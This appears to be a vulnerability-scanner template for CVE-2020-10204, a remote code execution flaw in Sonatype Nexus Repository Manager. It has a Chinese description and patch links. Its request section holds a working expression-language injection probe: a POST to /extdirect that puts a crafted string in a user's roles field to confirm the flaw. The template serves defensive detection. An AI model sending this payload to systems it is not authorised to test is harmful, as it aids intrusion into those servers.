id: CVE-2020-10204
info:
  name: Nexus Repository Manager 3.x 远程代码执行漏洞
  author:
  - l0ne1y
  description: |-
    Sonatype Nexus Repository Manager 代码执行漏洞
    Sonatype Nexus Repository是美国Sonatype公司的一款存储库管理器，它主要用于管理、存储和分发软件等。

    Sonatype Nexus Repository 3.21.2之前版本中存在安全漏洞。攻击者可利用该漏洞执行代码。
  reference:
  - https://cert.360.cn/report/detail?id=b3eaa020cf5c0e9e92136041e4d713bb
  - https://www.cnblogs.com/magic-zero/p/12641068.html
  - https://support.sonatype.com/hc/en-us/articles/360044882533-cve-2020-10199-nexus-repository-manager-3-remote-code-execution-2020-03-31
  severity: high
  remediation: |-
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

    https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31
requests:
- matchers:
  - type: word
    part: body
    words:
    - '{{randstr}}'
  - type: regex
    part: body
    negative: true
    regex:
    - \$\\\\c{{randstr}}
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/extdirect'
  method: POST
  body: '{"action":"coreui_User","method":"update","data":[{"userId":"anonymous","version":"1","firstName":"Anonymous","lastName":"User2","email":"anonymous@example.org","status":"active","roles":["$\\c{{{randstr}}}"]}],"type":"rpc","tid":28}'
  headers:
    Content-Type: application/json
